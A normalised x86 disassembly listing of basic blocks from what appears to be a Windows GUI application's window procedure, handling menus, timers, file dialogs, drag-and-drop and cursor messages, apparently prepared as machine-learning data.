jl r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
push 0x8
jmp r-xdata
mov ebx [ GetMenuItemInfoA@IAT ]
xor edi edi
dec eax
mov [ esp + 0x4c ] eax
mov esi 0x200
jmp r-xdata
add ecx 0xe0
call sub_41f020
push 0x0
push 0x8
jmp r-xdata
lea edx [ esp + 0x18 ]
push edx
push 0x1
push edi
lea ecx [ esp + 0x2bc ]
push ebp
mov [ esp + 0x28 ] 0x30
mov [ esp + 0x2c ] 0x11
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x50 ] esi
mov [ esp + 0x4c ] ecx
call ebx
mov ecx [ rw-data ]
xor eax eax
cmp edi ecx
setne al
lea ecx [ esp + 0x18 ]
push ecx
push 0x1
push edi
push ebp
mov [ esp + 0x30 ] esi
dec eax
and eax 0x8
mov [ esp + 0x34 ] eax
call [ SetMenuItemInfoA@IAT ]
inc edi
cmp edi 0x6
jl r-xdata
jmp r-xdata
push 0x1
push 0x72
push ebp
call [ EnableMenuItem@IAT ]
jmp r-xdata
push 0x0
push 0x72
push ebp
call [ EnableMenuItem@IAT ]
jmp r-xdata
mov edx [ rw-data ]
xor ecx ecx
cmp ebp edx
setne cl
mov [ esp + 0x18 ] 0x30
mov [ esp + 0x1c ] 0x11
mov [ esp + 0x20 ] esi
dec ecx
and ecx 0x8
mov [ esp + 0x24 ] ecx
lea ecx [ edi - 0x14 ]
call sub_4010a0
mov edx [ edi ]
mov [ esp + 0x3c ] eax
lea eax [ esp + 0x18 ]
push eax
push 0x1
push ebp
push ebx
mov [ esp + 0x50 ] edx
call [ SetMenuItemInfoA@IAT ]
add edi 0x1c
inc ebp
cmp edi rw-data
jl r-xdata
jmp r-xdata
push r--data
lea eax [ esi + 0x1f4 ]
push eax
push 0x0
push ebx
call edi
inc esi
cmp esi 0x15
jl r-xdata
jmp r-xdata
xor ebp ebp
lea esp [ esp ]
cmp bx 0x9ca4
jb r-xdata
cmp bx 0x8240
ja r-xdata
mov ecx rw-data
lea esi [ ebp - 0x56ce ]
call sub_4010c0
cmp esi eax
jge r-xdata
cmp al 0x1
jne r-xdata
cmp bx 0x9c60
je r-xdata
push 0x5
push eax
jmp r-xdata
mov eax [ rw-data ]
push eax
call sub_495c30
add esp 0x4
mov [ rw-data ] eax
mov ecx [ rw-data ]
xor esi esi
xor eax eax
test ecx ecx
je r-xdata
mov edx [ esp + 0x10950 ]
push 0x1
push 0x0
push edx
call sub_47e8e0
add esp 0xc
jmp r-xdata
mov cl [ rw-data ]
test cl cl
je r-xdata
mov [ rw-data ] al
mov [ rw-data ] al
mov ecx [ esp + 0x10950 ]
mov edx [ rw-data ]
push 0x1
push 0x0
push 0x0
push ecx
push edx
call sub_47e330
add esp 0x14
jmp r-xdata
mov edx [ esp + 0x10950 ]
mov eax [ rw-data ]
push 0x1
push 0x0
push 0x0
push edx
push eax
call sub_47e330
add esp 0x14
jmp r-xdata
mov esi [ esp + 0x64 ]
sub esi eax
xor esi esi
jmp r-xdata
mov edi [ esp + 0x64 ]
sub edi eax
xor edi edi
jmp r-xdata
mov al [ rw-data ]
test al al
mov esi [ esp + 0x10950 ]
mov edi [ SendMessageA@IAT ]
jne r-xdata
lea eax [ esp + 0x4c ]
push eax
call [ GetCursorPos@IAT ]
mov edx [ rw-data ]
lea ecx [ esp + 0x4c ]
push ecx
push edx
call [ ScreenToClient@IAT ]
movzx eax [ esp + 0x50 ]
movzx ecx [ esp + 0x4c ]
mov edx [ rw-data ]
shl eax 0x10
or eax ecx
push eax
push 0x0
push 0x200
push edx
call [ SendMessageA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x0
push 0x9c5f
push 0x111
push eax
mov [ rw-data ] 0x0
call [ SendMessageA@IAT ]
jmp r-xdata
lea ecx [ esp + 0x4c ]
push ecx
call [ GetCursorPos@IAT ]
mov eax [ rw-data ]
lea edx [ esp + 0x4c ]
push edx
push eax
call [ ScreenToClient@IAT ]
movzx ecx [ esp + 0x50 ]
movzx edx [ esp + 0x4c ]
mov eax [ rw-data ]
mov esi [ SendMessageA@IAT ]
shl ecx 0x10
or ecx edx
push ecx
push 0x0
push 0x200
push eax
call esi
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x5
push ecx
mov [ rw-data ] 0x2
call esi
jmp r-xdata
mov edx [ rw-data ]
push 0x0
push 0x9c5f
push 0x111
push edx
mov [ rw-data ] 0x1
call [ SendMessageA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov edx [ rw-data ]
push edx
call [ GetMenu@IAT ]
mov [ rw-data ] eax
mov eax [ rw-data ]
push 0x0
push eax
call [ SetMenu@IAT ]
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x92
push 0x6b
mov [ rw-data ] 0x2
call sub_458630
push 0x92
push 0x6c
call sub_458630
add esp 0x10
jmp r-xdata
push 0x6b
push 0x6c
mov [ rw-data ] 0x1
call sub_458630
push 0x6b
push 0x92
call sub_458630
add esp 0x10
jmp r-xdata
mov al [ esi + rw-data ]
test al al
jne r-xdata
lea eax [ esp + 0xb8 ]
push eax
mov [ esp + 0xec ] r--data
mov [ esp + 0xf0 ] 0x80006
call [ GetSaveFileNameA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] al
mov cl [ rw-data ]
test cl cl
je r-xdata
add ecx eax
mov [ rw-data ] ecx
jmp r-xdata
sub ecx eax
mov [ rw-data ] ecx
jmp r-xdata
mov [ rw-data ] esi
mov eax [ rw-data ]
cmp eax esi
mov [ rw-data ] 0x1
je r-xdata
test al al
lea ecx [ esp + 0x4c ]
sete al
push ecx
mov [ rw-data ] al
call [ GetCursorPos@IAT ]
mov esi [ esp + 0x10950 ]
lea edx [ esp + 0x4c ]
push edx
push esi
call [ ScreenToClient@IAT ]
mov al [ rw-data ]
test al al
je r-xdata
push ecx
call [ ShowCursor@IAT ]
mov al [ rw-data ]
mov eax [ rw-data ]
cmp eax ebp
mov esi [ esp + 0x10950 ]
je r-xdata
push eax
call [ DestroyMenu@IAT ]
inc eax
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov esi edi
imul esi esi 0x70
mov edx [ rw-data ]
push 0xffffffff
push 0x0
add edx 0x8
push edx
mov ecx rw-data
mov [ rw-data ] 0x130
call sub_401dd0
mov eax [ rw-data ]
cmp [ eax + 0x20 ] esi
jb r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
push sub_45ba40
push 0x1388
push 0x3
push ecx
mov [ rw-data ] eax
call [ SetTimer@IAT ]
mov edx [ esp + 0x10950 ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push edx
mov [ rw-data ] eax
call sub_466930
mov eax [ rw-data ]
add esp 0x18
push 0x0
push 0x0
push eax
call [ InvalidateRect@IAT ]
mov edx [ rw-data ]
lea ecx [ esp + 0x2b0 ]
push ecx
push edx
call [ SetWindowTextA@IAT ]
mov eax [ edi + 0x9c ]
test eax eax
mov ecx 0x3
jge r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
mov eax [ rw-data ]
test eax eax
jbe r-xdata
mov eax [ ebx + 0x90 ]
cmp eax 0x1
jne r-xdata
cmp [ rw-data ] ebx
mov esi [ rw-data ]
jae r-xdata
cmp [ rw-data ] ebx
jb r-xdata
mov eax [ esp + 0x10 ]
inc eax
mov ecx rw-data
mov [ esp + 0x10 ] eax
add edi 0x70
call sub_4010f0
cmp [ esp + 0x10 ] eax
jl r-xdata
mov eax [ rw-data ]
lea edx [ edi + eax ]
lea ecx [ esi + eax ]
push edx
call sub_402540
mov ecx [ rw-data ]
mov [ esi + ecx + 0x48 ] ebx
mov edx [ rw-data ]
mov [ esi + edx + 0x38 ] ebx
inc ebx
add esi 0x70
push edx
push ecx
push eax
call sub_4b69f0
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ ebx + 0x48 ]
inc ecx
push ecx
call j_sub_4b573e#2
mov ebp eax
xor esi esi
add esp 0x4
cmp ebp esi
je r-xdata
mov edx [ esp + 0x10958 ]
push 0x208
lea ecx [ esp + 0x4c8 ]
push ecx
push esi
push edx
call [ DragQueryFileA@IAT ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x4d4 ]
push eax
push 0x0
call sub_423c30
add esp 0x18
lea edx [ esp + 0x4c4 ]
push ebp
push edx
call sub_4580e0
add esp 0x8
test eax eax
je r-xdata
cmp eax [ esp + 0x58 ]
jg r-xdata
xor esi esi
test ebx ebx
jbe r-xdata
push 0x1
push 0x0
jmp r-xdata
push 0x119
push ebx
call esi
push 0x8
call [ IsClipboardFormatAvailable@IAT ]
test eax eax
je r-xdata
cmp edi 0x5
jne r-xdata
cmp eax 0xb
jne r-xdata
mov [ esp + 0x24 ] 0x8
jmp r-xdata
mov [ esp + 0x24 ] 0x0
test eax eax
mov [ esp + 0x24 ] 0x8
je r-xdata
lea eax [ esp + 0x18 ]
push eax
push 0x0
push ebx
push ebp
call [ SetMenuItemInfoA@IAT ]
inc edi
cmp edi 0x6
jl r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x0
push 0x156
push ebp
call [ CheckMenuItem@IAT ]
jmp r-xdata
push 0x8
push 0x156
push ebp
call [ CheckMenuItem@IAT ]
jmp r-xdata
push 0x1
lea ecx [ eax + 0x70 ]
call sub_41f020
test eax eax
jle r-xdata
push 0xc3
push esi
call ebx
mov ebp [ rw-data ]
mov edi [ EnableMenuItem@IAT ]
xor eax eax
test ebp ebp
sete al
mov ebp eax
push ebp
push 0xc6
push esi
call edi
push ebp
push 0xf5
push esi
call edi
push ebp
push 0xfb
push esi
call edi
push ebp
push 0x15e
push esi
call edi
mov eax [ rw-data ]
test eax eax
je r-xdata
lea eax [ esp + 0x18 ]
push eax
push 0x1
push edi
lea edx [ esp + 0x2bc ]
push ebp
mov [ esp + 0x28 ] 0x30
mov [ esp + 0x2c ] 0x11
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x50 ] esi
mov [ esp + 0x4c ] edx
call ebx
mov edx [ esp + 0x4c ]
mov eax [ rw-data ]
xor ecx ecx
cmp edi edx
setne cl
mov [ esp + 0x20 ] esi
dec ecx
and ecx 0x8
test eax eax
mov [ esp + 0x24 ] ecx
je r-xdata
push 0x0
push 0x8
jmp r-xdata
push 0x9c53
push ebp
call esi
cmp [ rw-data ] edi
jne r-xdata
lea ecx [ esp + 0x18 ]
push ecx
push 0x0
lea ebx [ ebp + 0x17c ]
push ebx
lea eax [ esp + 0x2bc ]
push edi
mov [ esp + 0x28 ] 0x30
mov [ esp + 0x2c ] 0x11
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x50 ] esi
mov [ esp + 0x4c ] eax
call [ GetMenuItemInfoA@IAT ]
mov eax [ rw-data ]
xor edx edx
cmp ebp eax
setne dl
lea eax [ esp + 0x18 ]
push eax
push 0x0
push ebx
push edi
mov [ esp + 0x30 ] esi
dec edx
and edx 0x8
mov [ esp + 0x34 ] edx
call [ SetMenuItemInfoA@IAT ]
inc ebp
cmp ebp 0x3
jl r-xdata
xor ebp ebp
jmp r-xdata
cmp bx 0x9c49
jb r-xdata
cmp bx 0x9caa
ja r-xdata
mov ecx [ rw-data ]
lea eax [ ebp - 0x8235 ]
cmp ecx eax
jne r-xdata
mov eax [ rw-data ]
imul esi esi 0x1c
cmp [ esi + eax + 0x18 ] 0x10
jb r-xdata
mov ecx [ rw-data ]
push ecx
call [ SetFocus@IAT ]
jmp r-xdata
mov eax [ rw-data ]
test eax eax
mov esi [ esp + 0x10950 ]
je r-xdata
mov esi [ esp + 0x10950 ]
push sub_45cdc0
push 0xc8
push 0x2
push esi
mov [ rw-data ] 0x64
call [ SetTimer@IAT ]
push rw-data
mov [ rw-data ] eax
call [ GetCursorPos@IAT ]
mov eax [ rw-data ]
test eax eax
mov [ rw-data ] 0x1
je r-xdata
call [ ShowWindow@IAT ]
mov esi [ esp + 0x10950 ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call sub_466930
mov edx [ esp + 0x80 ]
mov ecx [ esp + 0x78 ]
mov eax [ esp + 0x7c ]
mov ebp [ esp + 0x74 ]
sub edx ecx
add esp 0x18
shl edx 0x10
sub eax ebp
or edx eax
push edx
push 0x0
push 0x5
push esi
call [ SendMessageA@IAT ]
jmp r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
cmp [ ecx + 0x360 ] edi
jb r-xdata
push 0x0
push 0x1
jmp r-xdata
lea edx [ esp + 0xb8 ]
push edx
mov [ esp + 0xe8 ] eax
mov [ esp + 0xec ] r--data
mov [ esp + 0xf0 ] 0x881020
mov [ esp + 0xf4 ] bx
mov [ esp + 0xf6 ] bx
mov [ esp + 0xf8 ] ebx
mov [ esp + 0xfc ] ebx
mov [ esp + 0x100 ] sub_465090
mov [ esp + 0x104 ] ebx
call [ GetOpenFileNameA@IAT ]
test eax eax
je r-xdata
mov eax rw-data
push ebx
lea eax [ esi + 0xff ]
push eax
lea ecx [ esp + 0x64 ]
call sub_46b020
mov eax [ esp + 0x60 ]
lea edi [ eax + esi ]
mov ecx 0x3f
lea esi [ esp + 0x130 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov ecx [ rw-data ]
mov [ esp + 0xc4 ] eax
mov eax 0x103
mov [ esp + 0xd8 ] eax
mov [ esp + 0xe0 ] eax
mov eax [ rw-data ]
mov [ esp + 0xbc ] ecx
lea edx [ esp + 0x6cc ]
lea ecx [ esp + 0x820 ]
cmp eax ebp
mov eax [ rw-data ]
mov [ esp + 0xc0 ] ebx
mov [ esp + 0xc8 ] ebx
mov [ esp + 0xcc ] ebx
mov [ esp + 0xd0 ] 0x1
mov [ esp + 0xd4 ] edx
mov [ esp + 0xdc ] ecx
jae r-xdata
mov ecx [ esp + 0x90 ]
mov eax [ esp + 0x60 ]
mov edx ecx
shr ecx 0x2
add edi eax
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
cmp [ esp + 0x90 ] ebx
jbe r-xdata
lea esi [ esp + 0x80 ]
mov eax [ esp + 0x90 ]
push ebx
add eax edi
push eax
lea ecx [ esp + 0x64 ]
call sub_46b020
mov eax [ esp + 0x94 ]
mov esi [ esp + 0x80 ]
mov ebp 0x10
cmp eax ebp
jae r-xdata
test [ rw-data ] 0x8
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
mov eax [ rw-data ]
push eax
call [ SetMenu@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x0
push 0x0
push 0x5
push eax
mov [ rw-data ] 0x2
call [ SendMessageA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
lea ecx [ esp + 0x130 ]
push ecx
mov ecx [ esi * 4 + rw-data ]
imul ecx ecx 0x1c
mov edx esi
shl edx 0x4
add ecx [ edx + rw-data ]
call sub_402510
push esi
call sub_423170
mov eax [ rw-data ]
add esp 0x4
test eax eax
je r-xdata
push 0x0
push esi
call sub_4221d0
add esp 0x8
xor edx edx
mov dl [ rw-data ]
push edx
call sub_451690
mov al [ rw-data ]
add esp 0x4
test al al
jne r-xdata
call sub_452350
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov cl [ rw-data ]
test cl cl
mov [ rw-data ] 0x0
jne r-xdata
call sub_43d170
push eax
call sub_441600
add esp 0x4
test eax eax
jne r-xdata
push 0x0
push 0x1
mov eax [ rw-data ]
lea ecx [ esp + 0x5c ]
push ecx
mov [ esp + 0x60 ] edi
mov [ esp + 0x64 ] 0x2
mov [ esp + 0x68 ] eax
call [ _TrackMouseEvent@IAT ]
push 0x0
push 0x0
jmp r-xdata
mov eax [ rw-data ]
cmp eax ebp
je r-xdata
push eax
push esi
call [ KillTimer@IAT ]
cmp eax [ rw-data ]
jge r-xdata
cmp [ esp + 0x48 ] eax
jg r-xdata
mov esi [ esp + 0x1095c ]
mov ebx edi
jmp r-xdata
mov eax [ rw-data ]
inc edi
add esi 0x70
cmp edi eax
jl r-xdata
add eax 0xc
mov eax [ eax + 0xc ]
jmp r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0xa4
call sub_48a5f0
add esp 0xc
mov ecx rw-data
jmp r-xdata
push eax
call sub_464fe0
mov ecx rw-data
jmp r-xdata
mov eax rw-data
mov [ esp + 0x94 ] 0xf
mov [ esp + 0x90 ] 0x0
mov [ esp + 0x80 ] 0x0
mov eax [ rw-data ]
test eax eax
push 0xffffffff
mov [ esp + 0x1094c ] 0xd
push 0x0
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
cmp eax 0x2
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push esi
call sub_457f40
add esp 0x4
add eax esi
push eax
lea ecx [ esp + 0x9c ]
call sub_402510
cmp [ esp + 0xb0 ] ebx
mov eax [ esp + 0x9c ]
jae r-xdata
mov esi rw-data
mov esi rw-data
jmp r-xdata
mov esi [ rw-data ]
jmp r-xdata
mov eax [ esp + 0x1095c ]
mov edx [ eax + 0x40 ]
cmp [ ebp + 0x18 ] 0x10
jb r-xdata
mov [ ebp ] 0x0
cmp [ ebx + 0xcc ] esi
jne r-xdata
mov esi [ esp + 0x10958 ]
push 0x208
lea ecx [ esp + 0x4c8 ]
push ecx
push 0x0
push esi
call ebp
test eax eax
je r-xdata
mov edx [ esp + 0x10958 ]
push edx
call [ DragFinish@IAT ]
mov eax [ rw-data ]
and eax 0x7
cmp al 0x3
jne r-xdata
mov edi [ lstrcmpiA@IAT ]
mov ebx [ lstrlenA@IAT ]
push 0x1
push 0x0
jmp r-xdata
push 0x9c56
push ebx
call esi
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp eax 0x1d
jne r-xdata
mov [ esp + 0x24 ] 0x8
jmp r-xdata
lea ecx [ esp + 0x18 ]
push ecx
push 0x0
lea ebx [ edi + 0x9c49 ]
push ebx
lea eax [ esp + 0x2bc ]
push ebp
mov [ esp + 0x28 ] 0x30
mov [ esp + 0x2c ] 0x11
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x50 ] esi
mov [ esp + 0x4c ] eax
call [ GetMenuItemInfoA@IAT ]
cmp edi 0x2
mov eax [ rw-data ]
mov [ esp + 0x20 ] esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
mov esi [ CheckMenuItem@IAT ]
jne r-xdata
push 0x8
push 0x0
jmp r-xdata
cmp [ rw-data ] 0x1d
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
jmp r-xdata
lea edx [ esp + 0x18 ]
push edx
push 0x1
push edi
push ebp
call [ SetMenuItemInfoA@IAT ]
inc edi
cmp edi 0x13
jl r-xdata
mov ecx [ eax + 0xa0 ]
test ecx ecx
je r-xdata
push 0x0
push 0x8
jmp r-xdata
push 0x9c54
push ebp
call esi
cmp [ rw-data ] 0x8
jl r-xdata
lea edx [ esp + 0x18 ]
push edx
push 0x0
lea ebx [ ebp + 0x179 ]
push ebx
lea ecx [ esp + 0x2bc ]
push edi
mov [ esp + 0x28 ] 0x30
mov [ esp + 0x2c ] 0x11
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x50 ] esi
mov [ esp + 0x4c ] ecx
call [ GetMenuItemInfoA@IAT ]
mov ecx [ rw-data ]
xor eax eax
cmp ebp ecx
setne al
lea ecx [ esp + 0x18 ]
push ecx
push 0x0
push ebx
push edi
mov [ esp + 0x30 ] esi
dec eax
and eax 0x8
mov [ esp + 0x34 ] eax
call [ SetMenuItemInfoA@IAT ]
inc ebp
cmp ebp 0x3
jl r-xdata
cmp bx 0x15f
jb r-xdata
cmp bx 0x9c4a
ja r-xdata
lea eax [ ebp - 0x9ca4 ]
cmp eax 0x6
ja r-xdata
cmp eax 0xb
mov esi ecx
mov [ rw-data ] eax
jne r-xdata
cmp eax 0xb
jne r-xdata
lea eax [ esi + eax + 0x4 ]
mov eax [ esi + eax + 0x4 ]
jmp r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
push eax
push esi
call [ KillTimer@IAT ]
mov eax [ rw-data ]
test eax eax
mov ebp [ GetWindowRect@IAT ]
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
cmp [ rw-data ] edi
mov ecx [ rw-data ]
jae r-xdata
cmp [ rw-data ] edi
mov ecx [ rw-data ]
jae r-xdata
lea esi [ ecx + 0x34c ]
mov esi [ ecx + 0x34c ]
jmp r-xdata
push 0x3f5
push eax
call [ CheckDlgButton@IAT ]
lea ecx [ esp + 0x7c ]
call sub_4480e0
lea ecx [ esp + 0x5c ]
call sub_462cf0
jmp r-xdata
call sub_46fe50
push 0x1
lea eax [ esp + 0x6d0 ]
push 0xffffffff
push eax
call sub_425d10
add esp 0xc
cmp eax ebx
mov ecx 0x3f
mov esi r--data
lea edi [ esp + 0x130 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
jne r-xdata
cmp eax ebx
mov ecx 0x7
mov esi r--data
lea edi [ esp + 0x98 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
test [ rw-data ] 0x8
je r-xdata
push 0x0
push 0xaf
push 0x111
push esi
call edi
push 0x0
push 0x0
push eax
call [ InvalidateRect@IAT ]
jmp r-xdata
mov ecx [ rw-data ]
push ecx
call [ SetFocus@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push eax
call [ SetFocus@IAT ]
jmp r-xdata
push 0x1
push rw-data
call sub_42dee0
add esp 0x8
cmp [ rw-data ] edi
mov eax [ rw-data ]
jae r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
call sub_46fdf0
mov edx [ rw-data ]
push 0x1
push esi
push edx
call [ InvalidateRect@IAT ]
mov eax [ rw-data ]
push eax
call [ UpdateWindow@IAT ]
jmp r-xdata
mov [ rw-data ] esi
jmp r-xdata
mov edx [ rw-data ]
mov eax [ edx * 4 + rw-data ]
mov ecx [ rw-data ]
mov edx [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x54 ]
push 0x0
push esi
push eax
mov eax [ esp + 0x64 ]
push edx
push eax
push ecx
call sub_477a80
add esp 0x20
jmp r-xdata
mov eax [ rw-data ]
cmp eax ebp
je r-xdata
push eax
call ebx
cmp [ esi + 0x90 ] 0x1
jne r-xdata
mov eax [ rw-data ]
add eax esi
push ebp
push eax
call sub_4013c0
add esp 0x8
test al al
jne r-xdata
mov esi [ esp + 0x1095c ]
jmp r-xdata
push eax
lea eax [ esp + 0x2b4 ]
push r--data
push eax
call ebx
add esp 0xc
add esp 0x4
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx [ rw-data ]
push edx
jmp r-xdata
mov esi [ rw-data ]
sub esi eax
sar esi 0x2
xor esi esi
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push eax
call sub_458010
add esp 0x4
push eax
lea ecx [ esp + 0x9c ]
call sub_401f60
push r--data
lea ecx [ esp + 0x9c ]
call sub_402010
push 0xffffffff
push edi
push rw-data
lea ecx [ esp + 0x11c ]
call sub_401dd0
cmp [ esp + 0x128 ] ebx
mov eax [ esp + 0x114 ]
jae r-xdata
lea eax [ esp + 0x9c ]
cmp [ ebx + 0xd0 ] 0x10
jb r-xdata
mov eax [ ebx + 0xd4 ]
cmp eax esi
je r-xdata
push esi
call [ DragFinish@IAT ]
jmp r-xdata
push r--data
lea edx [ esp + 0x4c8 ]
push edx
call [ lstrlenA@IAT ]
lea ecx [ esp + 0x4c8 ]
sub ecx 0x4
add eax ecx
push eax
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ esp + 0x48 ]
inc esi
cmp esi eax
jb r-xdata
push r--data
lea eax [ esp + 0x4c8 ]
push eax
call ebx
lea ecx [ esp + 0x4c8 ]
sub ecx 0x4
add eax ecx
push eax
call edi
test eax eax
jne r-xdata
push 0x0
lea eax [ esp + 0x6d0 ]
push eax
push 0x154
push 0x29
mov [ esp + 0x6dc ] 0x154
call [ SystemParametersInfoA@IAT ]
lea ecx [ esp + 0x76c ]
push ecx
call [ CreateFontIndirectA@IAT ]
mov edx [ esp + 0x10950 ]
mov esi eax
push edx
mov [ esp + 0x50 ] esi
call [ GetDC@IAT ]
push esi
push eax
mov [ esp + 0x18 ] eax
call [ SelectObject@IAT ]
mov ecx rw-data
mov [ esp + 0x78 ] eax
call sub_4010c0
test eax eax
jle r-xdata
mov ebp [ DeleteMenu@IAT ]
push 0x9c57
push ebx
call esi
push ebx
call [ GetMenuItemCount@IAT ]
lea edi [ eax - 0x14 ]
xor esi esi
test edi edi
jle r-xdata
mov [ esp + 0x24 ] 0x8
jmp r-xdata
push 0x8
push 0x0
jmp r-xdata
push edi
call [ GetMenuItemCount@IAT ]
cmp eax 0x11
jle r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x9cab
push edi
call [ CheckMenuItem@IAT ]
cmp [ rw-data ] 0x1
jne r-xdata
push 0x1
push 0x0
jmp r-xdata
cmp [ eax + 0x380 ] 0x1
jne r-xdata
push 0xca
push esi
call edi
mov ecx rw-data
call sub_4010f0
test eax eax
jbe r-xdata
jmp r-xdata
or [ esp + 0x24 ] 0x3
push 0x0
push 0x8
jmp r-xdata
push 0xad
push ebp
call esi
mov eax [ rw-data ]
test eax eax
je r-xdata
jmp r-xdata
cmp bx 0x190
jb r-xdata
cmp bx 0x165
ja r-xdata
mov eax [ rw-data ]
cmp eax 0x1c
je r-xdata
jmp [ eax * 4 + jump_table_4a3690 ]
mov ecx [ rw-data ]
push ecx
push 0x1
push 0x8f
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov eax [ rw-data ]
push 0x0
push sub_488210
push edi
push 0xa3
push 0xfffffffa
push edi
mov [ esp + 0x90 ] eax
mov [ rw-data ] 0x1
call [ GetWindowLongA@IAT ]
push eax
call [ DialogBoxParamA@IAT ]
cmp eax 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ esi + eax + 0x18 ] 0x10
jb r-xdata
push 0x0
push eax
push 0x2
call sub_423680
add esp 0xc
cmp eax 0xffffff9d
jne r-xdata
mov eax [ rw-data ]
test eax eax
mov [ rw-data ] 0x0
je r-xdata
push 0x1
call [ ShowCursor@IAT ]
mov [ rw-data ] 0x1
push rw-data
push esi
call ebp
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov eax [ rw-data ]
mov [ rw-data ] ecx
mov ecx [ rw-data ]
mov [ rw-data ] edx
mov [ rw-data ] eax
mov [ rw-data ] ecx
jmp r-xdata
push 0x0
push eax
call [ ShowWindow@IAT ]
mov edx [ rw-data ]
push 0x1
push 0x0
push 0x0
push esi
push 0x0
push 0x0
push 0x1
push eax
mov eax [ esp + 0x10970 ]
push edx
push eax
push ecx
call sub_4863a0
add esp 0x2c
jmp r-xdata
mov ecx rw-data
mov edx [ rw-data ]
push 0x1
push 0x0
push 0x0
push esi
push 0x0
push 0x0
push 0x1
push eax
mov eax [ esp + 0x10970 ]
push edx
push eax
push ecx
call sub_4863a0
add esp 0x2c
jmp r-xdata
mov ecx rw-data
add ecx 0xe0
call sub_41f020
mov esi [ esp + 0x64 ]
sub esi eax
xor esi esi
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
push 0xc3
push 0x111
push esi
call edi
push eax
push rw-data
call [ lstrcpyA@IAT ]
mov eax rw-data
mov eax [ rw-data ]
cmp eax ebp
je r-xdata
push eax
call ebx
mov eax [ rw-data ]
xor ecx ecx
cmp eax ecx
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
lea ecx [ esp + 0x88 ]
call sub_401dd0
cmp [ esp + 0x90 ] 0x2
mov edi 0x10
jne r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
push 0x0
push sub_45f810
push eax
push 0x103
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
push eax
call [ DialogBoxParamA@IAT ]
cmp eax 0x1
jne r-xdata
push eax
call sub_457f00
add esp 0x4
test eax eax
je r-xdata
lea eax [ esp + 0x114 ]
lea eax [ ebx + 0xbc ]
mov eax [ ebx + 0xbc ]
jmp r-xdata
mov [ esp + 0x60 ] esi
mov [ esp + 0x64 ] esi
mov [ esp + 0x68 ] esi
cmp [ ebx + 0x20 ] 0x10
mov [ esp + 0x10948 ] esi
jb r-xdata
mov ecx [ ebx + 0x48 ]
mov edx ecx
shr ecx 0x2
mov esi eax
mov edi ebp
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x48 ]
mov [ eax + ebp ] 0x0
xor esi esi
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x4d4 ]
push ecx
push 0x3
call sub_423c30
mov eax [ rw-data ]
add esp 0x18
test eax eax
je r-xdata
mov edx [ esp + 0x10950 ]
push edx
lea eax [ esp + 0x4c8 ]
push eax
call sub_4580e0
add esp 0x8
test eax eax
je r-xdata
push 0x0
call sub_4290f0
mov ecx [ rw-data ]
add esp 0x4
push 0x0
push 0x0
push ecx
call [ InvalidateRect@IAT ]
call sub_45f170
jmp r-xdata
mov edx [ esp + 0x10958 ]
